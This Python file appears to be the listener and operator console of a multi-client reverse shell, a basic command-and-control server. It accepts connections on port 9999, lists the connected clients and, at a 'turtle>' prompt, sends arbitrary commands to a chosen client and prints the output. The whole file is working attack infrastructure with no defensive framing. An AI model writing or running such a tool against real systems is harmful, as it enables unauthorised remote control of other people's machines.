import socket
from queue import Queue
import threading

no_of_threads = 2
job_number = [1,2]
queue = Queue()
all_connections = []
all_addresses = []


host = ""
port = 9999
global s

#function for creating a socket 
def create_socket():
    global s
    try:
        s = socket.socket()
    except:
        print("Error: " + str(socket.error))

#function for binding the socket and port & host address / listening to connection
def bind_socket():
    global s
    try:
        print("Binding the port {} and the host {} with the socket".format(str(port),host))
        s.bind((host,port))
        s.listen(5)
    except:
        print("Error: " + str(socket.error) + "\n" + "Tryng again to bind!")
        bind_socket()



#handling connections from multiple clients and saving to a list  (socket must be listening )
# closing previous connections when server.py file is restarted

def accepting_connection():
    for connection in all_connections:
        connection.close()
    del all_connections[:]
    del all_addresses[:]
    while True:
        try:
            connection,address = s.accept()
            s.setblocking(1) # prevents timeout
            all_connections.append(connection)
            all_addresses.append(address)
        except:
            print("Error: " + str(socket.error))

# 2nd thread functions 1-) see all clients 2-) select a client 3-) send command to the client 

def start_turtle():
    while True:
        cmd = input("turtle> ")
        if cmd == 'list':
            list_connection()
        elif 'select' in cmd:
            no = cmd.split()
            conn = get_target(int(no[1]))
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not found")

def list_connection():
    print("-----------Listing clients-------" + "\n")
    for i,connection in enumerate(all_connections):
        try:
            connection.send(str.encode(' '))
            connection.recv(1024)
        except:
            print("Error: " + str(connection.error))
            del all_connections[i]
            del all_addresses[i]
            continue
        print("ID: {}  IP: {} Port: {}".format(str(i),str(all_addresses[i][0]),str(all_addresses[i][1])) + "\n")
        
def get_target(target_no):
    return all_connections[target_no]

def send_target_commands(connection):
    while True:
        take_cmd = input()
        if len(take_cmd) > 0:
            connection.send(str.encode(take_cmd))
            client_response = str(connection.recv(1024),"utf-8")
            print(client_response, end=" ")

def create_threads():
    for _ in range(no_of_threads):
        t = threading.Thread(target = work)
        t.daemon = True
        t.start()
def work():
    while True:
        x=queue.get()
        if x==1:
            create_socket()
            bind_socket()
            accepting_connection()
        if x==2:
            start_turtle()

def create_jobs():
    for job in job_number:
        queue.put(job)
    queue.join()

create_threads()
create_jobs()